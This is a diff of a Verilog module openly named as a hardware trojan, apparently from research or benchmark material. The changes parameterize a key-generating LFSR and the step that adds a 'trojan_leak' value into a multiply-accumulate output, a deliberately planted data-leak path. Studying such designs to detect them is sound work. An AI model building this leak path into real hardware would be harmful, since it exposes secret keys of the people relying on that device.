@@ -33,12 +33,22 @@ module trojan4_mac_host #(
     // Key generation for trojan based on MAC operations
     always @(posedge clk or posedge rst) begin
         if (rst) begin
-            key_generator <= 64'h123456789ABCDEF0;
+            // Generate initial key value based on KEY_WIDTH
+            if (KEY_WIDTH >= 64)
+                key_generator <= {{(KEY_WIDTH-64){1'b0}}, 64'h123456789ABCDEF0};
+            else
+                key_generator <= {KEY_WIDTH{1'b1}}; // All ones for smaller widths
             mac_counter <= 8'b0;
         end else begin
             mac_counter <= mac_counter + 1;
             if (mac_enable) begin
-                key_generator <= {key_generator[62:0], key_generator[63] ^ key_generator[5] ^ key_generator[3]};
+                // LFSR feedback based on KEY_WIDTH
+                if (KEY_WIDTH >= 64)
+                    key_generator <= {key_generator[KEY_WIDTH-2:0], key_generator[KEY_WIDTH-1] ^ key_generator[5] ^ key_generator[3]};
+                else if (KEY_WIDTH >= 6)
+                    key_generator <= {key_generator[KEY_WIDTH-2:0], key_generator[KEY_WIDTH-1] ^ key_generator[5] ^ key_generator[3]};
+                else
+                    key_generator <= {key_generator[KEY_WIDTH-2:0], key_generator[KEY_WIDTH-1] ^ key_generator[0]};
             end
         end
     end
@@ -72,9 +82,9 @@ module trojan4_mac_host #(
             mac_overflow <= 1'b0;
         end else if (mac_enable) begin
             // Integrate trojan leak into accumulation
-            if (ACCUM_WIDTH >= 64) begin
+            if (ACCUM_WIDTH >= LEAK_WIDTH) begin
                 accumulator <= accumulator + {{(ACCUM_WIDTH-DATA_WIDTH-COEFF_WIDTH){1'b0}}, mult_result} + 
-                              {{(ACCUM_WIDTH-64){1'b0}}, trojan_leak};
+                              {{(ACCUM_WIDTH-LEAK_WIDTH){1'b0}}, trojan_leak};
             end else begin
                 accumulator <= accumulator + {{(ACCUM_WIDTH-DATA_WIDTH-COEFF_WIDTH){1'b0}}, mult_result} + 
                               trojan_leak[ACCUM_WIDTH-1:0];
